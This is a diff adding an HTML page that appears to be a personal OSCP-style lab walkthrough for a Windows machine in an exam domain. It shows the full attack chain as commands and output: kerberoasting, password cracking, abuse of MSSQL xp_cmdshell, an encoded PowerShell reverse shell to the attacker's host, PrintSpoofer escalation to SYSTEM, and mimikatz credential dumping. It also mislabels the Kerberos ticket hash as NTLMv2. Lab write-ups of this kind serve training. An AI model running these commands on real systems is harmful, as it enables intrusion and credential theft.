@@ -1,0 +1,144 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX148</h1>
+    <h2 class="subtitle">Service Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ nxc mssql 10.10.75.148 -u web_svc -H 53e938166782a44e241beaf02d081ff6
+MSSQL       10.10.75.148    1433   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
+MSSQL       10.10.75.148    1433   MS02             [+] oscp.exam\web_svc:53e938166782a44e241beaf02d081ff6 </code></pre></div>
+
+<p class="text">I found that MSSQL is open on the target machine. I chekced if I can perform kerberoasting.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/targetedKerberoast]
+└─$ python3 targetedKerberoast.py --dc-ip 10.10.75.146 -d oscp.exam -u web_svc -H :53e938166782a44e241beaf02d081ff6
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (sql_svc)
+$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$b2c8196e92774170f495f1e2db9346b0$72715823b2b29ccb00d484843c5df407f00258b5998d54a648cf131b696ff76699ab5cc8555e1c7eb8e9277e660332b199c7e7a9a8a66f0af8a033e4048531a7aae64805819466d49035a6ddefecf73831ea8c3332e4176ccc3e2f4d0a4f669f6d117954377015dbe0c424c5cc085c45d06f8145251515cfab3b97f40917e6eba2a1841300236741a5c2188570b4c60b149489de180e22dc0f0ba1396a78eae15af540f274f3abe3421fb71fff0f9a6bafc2c908113044d752ed207db954665fa680f92a0cb18a84a8f03e9022e827d0f5c96f6a80e69c1f016928ff623a00ac4825a257ea7d155489c8b0e8c6e29809cdc2bbc921526a33b0f4eb3b705f0131795b8114dfbef5257d1e1decfada2389702c5c9dbf3cf8dfdd845657bc1a2ac832ada344daf4431d9229548429fd1a3e67906a7f3bdc2e28abc2e716fbec9a7b56c0bb7c29a2cfaec3acfbb9714ff569597a5ab236039b2f13bacca366a7712c3db56c99d0b306cf3e9f4e1e00ccf2e1c19bd7bd408fd98dad30ece40d3f57a01647b0356202ea899dcb47619e3dfb084ba97bbeb845d64a1de493b8262332b4adf62dd87085c7d69b60275f42d5d9bfd0ba26510d66df8143dc21ae09a1da1a00eef4aeaffba464f6ec93f47c8cec272343aecf54030b1053c0a279ee1c13593ae0504caed5e657e44dcfa58afcf38c4980eb5f61457d6c041b5651fe9366914a8fbf0eb8944a603502e5b87eb120e4002f7406f1c97e4c9f7d15bbe5908b0f39f1cc9e793868d3bb9a6df989c3f590e127a6429cf44bb30226cb0cd5e78c3eda14db2d0d6fe8ab829fc8c5ca347b32e22475531050fb3482bf2c157f6809a9781184dbab3f6e693abbf5f22bee770ac9ccfd9dace1e93703b0ac98ce2a0e7131147ec6890c543edd2bb11780dff41008437133b93d67e5f582be7948054ea3a7a99711aeb836fcdb085d48047570ac25d98dd5d0169ba005148ceb2a0d68c6efbf05daae0266d03faafad96ed9229e5aff1ade2f0afd9ee81e07d0de7a0f40620a22ee62b65073339d0ed9ecc4d9f864444c535cb92f7e1a5d43571328fa66266f2898a591565792d1c3a986549dcb0fadacdfbe4a69284d7185d7644dc97a17862789383198184389a89ea9ad74eaab1bb239ddb681fc4952c5d5281c9aa2ffc2b50a203d45194dee9e91c7bf3c2b1ca583ef51349021fef7e2006d58c43c46c5f77ada065197b0d5728e68eb8f64b27c51cdecac9b299c4f3eb271cbe73bc43a7e32a71cbd489c989d0a52a161ba48e3cc267b5abdf747f1cfb4d6b86506ce30eb27feeddb7c8314cbd6961020a14906e92fab9e73afb802ce0198009cb7529774ed0e81ba0d1d384c32d9e1278a6fdb63755046e32c94658b44c1f42f4c74</code></pre></div>
+
+<p class="text">I got sql_svc user's NTLMv2 hash. I copied and pasted this hash and tried cracking it.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/ad]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+...
+Dolphin1
+...</code></pre></div>
+<p class="text">I got password for sql_svc.</p>
+<p class="text">I logged on to MSSQL server with this credential. I used impacket-mssclclient.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/ad]
+└─$ impacket-mssqlclient oscp.exam/sql_svc:'Dolphin1'@10.10.75.148 -windows-auth                     
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(MS02\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (OSCP\sql_svc  dbo@master)> </code></pre></div>
+
+<h2 class="subtitle">Getting Reverse Shell</h2>
+<p class="text">Since the sql_svc user has command shell privilege, I abused this functionality to get reverse shell.</p>
+<div class="code-box"><pre><code>SQL (OSCP\sql_svc  dbo@master)> enable_xp_cmdshell
+INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (OSCP\sql_svc  dbo@master)> xp_cmdshell whoami
+output                        
+---------------------------   
+nt service\mssql$sqlexpress   
+NULL</code></pre></div>
+<p class="text">To get reverse shell, I used base64 encoded reverse shell. For that purpose, I needed to add new tunnel. Back to the ligolo-ng and executed command like below.</p>
+<div class="code-box"><pre><code>[Agent : OSCP\eric.wallows@MS01] » listener_add --addr 10.10.75.147:4444 --to 192.168.45.244:4444 --tcp
+INFO[1301] Listener 0 created on remote agent!</code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/nc.exe]
+└─$ impacket-smbserver share . -smb2support
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</code></pre></div>
+<p class="text">I set the target IP 10.10.75.147(the MS01's IP) and launched below commnad.</p>
+<div class="code-box"><pre><code>SQL (OSCP\sql_svc  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4ANwA1AC4AMQA0ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA</code></pre></div>
+
+<p class="text">I got reverse shell.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/ad]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.244] from (UNKNOWN) [192.168.45.244] 39902
+whoami
+nt service\mssql$sqlexpress
+PS C:\Windows\system32> </code></pre></div>
+
+<h2 class="subtitle">Privilege Escalation</h2>
+<p class="text">Since the user sql_svc has SeImpersonatePrivilege, I used PrintSpoofer64.exe again.</p>
+<div class="code-box"><pre><code>PS C:\Windows\system32> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled</code></pre></div>
+<p class="text">To serve PrintSpoofer64, I started http server with python with a port 4444.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/PrintSpoofer]
+└─$ python3 -m http.server 4444
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...</code></pre></div>
+<p class="text">And request PrintSpoofer.</p>
+<div class="code-box"><pre><code>PS C:\programdata> Invoke-WebRequest -URI "http://10.10.75.147:4444/PrintSpoofer64.exe" -outfile PrintSpoofer64.exe</code></pre></div>
+
+<p class="text">To get reverse shell, I started nc.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/PrintSpoofer]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...</code></pre></div>
+
+<p class="text">Again I used base64 encoded reverse shell with 10.10.75.147.</p>
+<div class="code-box"><pre><code>PS C:\programdata> .\PrintSpoofer64.exe -i -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4ANwA1AC4AMQA0ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"</code></pre></div>
+<p class="text">I got NA user.</p>
+<div class="code-box">┌──(kali㉿kali)-[~/utils/Windows/PrintSpoofer]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.244] from (UNKNOWN) [192.168.45.244] 43042
+whoami
+nt authority\system
+PS C:\Windows\system32> </div>
+
+<p class="text">I served mimikatz.exe and extracted all credentials stored in MS02 like before.</p>
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> .\mimikatz.exe "privileger::debug" "sekurlsa::logonpasswords" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+...
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : OSCP
+         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
+         * SHA1     : f41a495e6d341c7416a42abd14b9aef6f1eb6b17
+         * DPAPI    : 959ad2ea78c63aebf3233679ad90d769
+...</code></pre></div>
+
+<p class="text">I got admin NTLM hash.</p>
+
+
+</body>
+</html>
